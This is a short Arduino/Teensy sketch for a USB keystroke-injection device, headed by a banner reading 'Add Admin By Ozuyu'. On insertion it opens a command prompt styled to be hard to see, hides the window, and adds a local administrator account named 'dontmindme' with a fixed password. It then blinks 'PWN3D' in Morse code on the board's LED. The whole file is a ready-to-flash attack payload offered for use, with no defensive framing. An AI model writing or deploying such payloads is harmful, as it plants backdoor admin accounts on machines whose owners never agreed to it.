/***
 *      ___      _     _    ___      _           _       
 *     / _ \    | |   | |  / _ \    | |         (_)      
 *    / /_\ \ __| | __| | / /_\ \ __| |_ __ ___  _ _ __  
 *    |  _  |/ _` |/ _` | |  _  |/ _` | '_ ` _ \| | '_ \ 
 *    | | | | (_| | (_| | | | | | (_| | | | | | | | | | |
 *    \_| |_/\__,_|\__,_| \_| |_/\__,_|_| |_| |_|_|_| |_|
 *                                                       
 *                                                       
 *    ______         _____                               
 *    | ___ \       |  _  |                              
 *    | |_/ /_   _  | | | |_____   _ _ __ _   _          
 *    | ___ \ | | | | | | |_  / | | | '__| | | |         
 *    | |_/ / |_| | \ \_/ // /| |_| | |  | |_| |         
 *    \____/ \__, |  \___//___|\__,_|_|   \__,_|         
 *            __/ |                                      
 *           |___/                                       
 */
 
#include <paensy.h>

void setup() {
  
  // Configure the delay that everything else scales off of.
  SetDelay(100);
  // Configure the delay that the Morse code uses.
  SetMorseDelay(250);
  
  // Perform an initial delay to give the USB time to prepare.
  PerformInitDelay();
  
  // LED pin number, 13 for 3.1
  // 11 for 2 and 2.x
  SetLEDPin(13);
  
  // Put pin into output mode.
  pinMode(GetLEDPin(), OUTPUT);
  
  // Turn on the LED pin so we know the drive is running.
  digitalWrite(GetLEDPin(), HIGH);
  
  delay(1000);
  
  // Open a command prompt that is harder to see.
  RunCommand("cmd /Q /D /T:7F /F:OFF /V:ON /K");
  
  delay(500);
  
  // Hide the current window (the command prompt we just opened).
  HideCurWindow(1080);
  
  delay(500);
  
  // Add a new admin user.
  AddUser("dontmindme", "SecurePass");
}

void loop() {
 // Celebratory LED fluttering.
 LED_Flutter(200, 10);
 
 // P
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 LED_MorseDot();
 
 // W
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 
 // N
 LED_MorseDash();
 LED_MorseDot();

 // 3
 LED_MorseDot();
 LED_MorseDot();
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 
 // D
 LED_MorseDash();
 LED_MorseDot();
 LED_MorseDot();
 
 // Flutter again.
 LED_Flutter(200, 10); 
}